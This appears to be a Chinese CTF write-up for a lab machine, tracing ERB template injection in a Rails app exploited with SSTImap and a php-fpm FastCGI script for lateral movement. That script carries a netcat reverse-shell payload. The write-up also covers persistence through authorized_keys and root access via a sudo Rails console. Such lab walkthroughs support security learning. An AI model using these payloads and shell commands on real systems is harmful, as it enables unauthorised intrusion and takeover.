![[Pasted image 20240913144412.png]]

# 端口扫描

`PORT     STATE SERVICE  VERSION`  
`22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)`  
`| ssh-hostkey:`    
`|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)`  
`|_  256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)`  
`3000/tcp open  ssl/ppp?`  
`| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=FR`  
`| Not valid before: 2024-05-20T15:36:20`  
`|Not valid after:  2038-01-27T15:36:20`  
`|_ssl-date: TLS randomness does not represent time`  
`| fingerprint-strings:`    
`|   GenericLines:`    
`|     HTTP/1.0 400 Bad Request`  
`|     Content-Length: 930`  
`|     Puma caught this error: Invalid HTTP format, parsing fails. Are you trying to open an SSL connection to a non-SSL Puma? (Puma::HttpParserError)`  
`|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/client.rb:268:in execute'`  
`|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/client.rb:268:in try_to_finish'`  
`|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/server.rb:298:in reactor_wakeup'`  
`|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/server.rb:248:in block in run'`  
`|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:119:in wakeup!'`  
`|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in block in select_loop'`  
`|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in select'`  
`|     /usr/local/rvm/gems/ruby-3.1.0/gems/puma-6.4.2/lib/puma/reactor.rb:76:in select_loop'`  
`|     /usr/loc`

通过搜索发现3000端口为Rails的Puma服务器默认端口

# 功能测试

访问https://xx.xx.xx.xx:3000,会进入如下网页，网页提供了hacker的硬件推荐，例如Filpper Zero啥的
![[Pasted image 20240913144903.png]]

我们随意点击一个超链接，如图所示
![[Pasted image 20240913145108.png]]
接下来我们搜索一下，看看有没有什么设备是没有的
![[Pasted image 20240913145228.png]]
注意后面的message,为Product+does+not+exist，很明显了，这里有ssti的问题，可以搞ssti注入，但是因为这个服务器是由Ruby搭建的（具体来说是Ruby on Rails），你直接搜ssti还不行，这里应该说是ERB Template injection（ERB示例注入）。
参考链接：[ERB-SSTI](https://www.trustedsec.com/blog/rubyerb-template-injection)
我们以<%=7 * 7%>为载荷测试一下，用burpsuite更改一下message后面的内容
![[Pasted image 20240913145806.png]]
发现确实可以运行，那么这里推荐一个工具，[SSTIMap](https://github.com/vladko312/SSTImap)，--help展示如下

`nwkyo@Fruit ~/C/h/hackingtoys> python ../../../Tools/SSTImap/sstimap.py -h`     
`usage: sstimap.py [-h] [-V] [--config CONFIG] [--no-color] [-u URL] [-i] [--load-urls LOAD_URLS] [--load-forms LOAD_FORMS] [-M MARKER] [-d DATA]`  
                 `[--data-type DATA_TYPE] [--data-params KEY=VALUE] [-H HEADER] [-C COOKIE] [-m METHOD] [-a USER_AGENT] [-A] [--delay DELAY]`  
                 `[-p PROXY] [--verify-ssl] [--log-response] [-c CRAWL_DEPTH] [-f] [--empty-forms] [--crawl-exclude CRAWL_EXCLUDE]`  
                 `[--crawl-domains CRAWL_DOMAINS] [--save-urls SAVE_URLS] [--save-forms SAVE_FORMS] [-l LEVEL] [-L LEVEL CLEVEL] [-e ENGINE]`  
                 `[-r TECHNIQUE] [--blind-delay TIME_BASED_BLIND_DELAY] [--verify-blind-delay TIME_BASED_VERIFY_BLIND_DELAY] [--legacy]`  
                 `[--skip-generic] [--run] [-t] [-T TPL_CODE] [-x] [-X EVAL_CODE] [-s] [-S OS_CMD] [-B PORT] [-R HOST PORT]`  
                 `[--remote-shell REMOTE_SHELL] [-F] [-U LOCAL REMOTE] [-D REMOTE LOCAL]`
                 
和sqlmap用法差不多，同样的-u提供url，所以我们要测试messages是否如我们所料的那样

`python ../../../Tools/SSTImap/sstimap.py -u 'https://192.168.56.101:3000/search?query=1&message=*'`

`[+] Erb plugin has confirmed injection with tag '*'`
`[+] SSTImap identified the following injection point:`

  `Query parameter: message`
  `Engine: Erb`
  `Injection: *`
  `Context: text`
  `OS: x86_64-linux`
  `Technique: render`
  `Capabilities:`

    `Shell command execution: ok`
    `Bind and reverse shell: ok`
    `File write: ok`
    `File read: ok`
    `Code evaluation: ok, ruby code`
`……`

确实如我们所想的那样哈，sstimap和sqlmap一样有`--os-shell`功能，直接在后面添加即可

`python ../../../Tools/SSTImap/sstimap.py -u 'https://192.168.56.101:3000/search?query=1&message=*' --os-shell`

![[Pasted image 20240913150617.png]]
Now we‘re in

# 用户过程

## lidia

我们通过上述方法进入到的用户是lidia用户，具体怎么确认用户这里不做叙述
可以下载linpeas.sh去跑一下是否有感兴趣的东西，这里我翻了很久之后看了一下端口以及进程

![[Pasted image 20240913151003.png]]
发现本地起了9000端口，且用户dodi在运行php-fpm，后面我百度了一下发现了某个大佬的随笔说php-fpm可以直接rce,参考链接在这里：[https://exploit-notes.hdks.org/exploit/network/fastcgi-pentesting/](https://exploit-notes.hdks.org/exploit/network/fastcgi-pentesting/)

脚本内容如下：

`#!/bin/bash`

`PAYLOAD="<?php echo '<!--'; system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f'); echo '-->';"`
`FILENAMES="/dev/shm/index.php" # Exisiting file path`

`HOST=$1`
`B64=$(echo "$PAYLOAD"|base64)`

`for FN in $FILENAMES; do`
    `OUTPUT=$(mktemp)`
    `env -i \`
      `PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \`
      `SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \`
      `cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT`

    `cat $OUTPUT`
`done`

不过在写入这个脚本前记得做持久化登录，Linux这里是做`.ssh/authorized_keys`,Windows的话我记得是写入WinLogon/Userlist注册表条目去

做完后写入保存，并运行，然后就进入dodi的世界里
![[Pasted image 20240913151823.png]]
![[Pasted image 20240913151856.png]]
## dodi

进入之后常规检查sudo -l,发现如下内容
![[Pasted image 20240913151954.png]]

让我们看看这个脚本是怎么个事
![[Pasted image 20240913152040.png]]
这里是说要先创建一个新的Rails应用才能进行下一步的操作，例如进console和测试应用，那么我们可以先创建一个Rails应用然后再进入console

`sudo /usr/local/bin/rvm_rails.sh new rrc`

因为我这里已经创建好了，所以不放过程，我们进入已经创建好的应用文件夹内，例如这里是rrc,进入后执行

`sudo /usr/local/bin/rvm_rails.sh console`

现在已经进入console里了，在这里已经获取root权限了，但是我们面对的是这么一个界面
![[Pasted image 20240913152558.png]]

有两种方式可以执行root命令：
1.
![[Pasted image 20240913153015.png]]
2.创建一个xxxxx.rb，然后文件里就写如图所示的代码，然后通过irb_load去加载这个rb文件
![[Pasted image 20240913153534.png]]



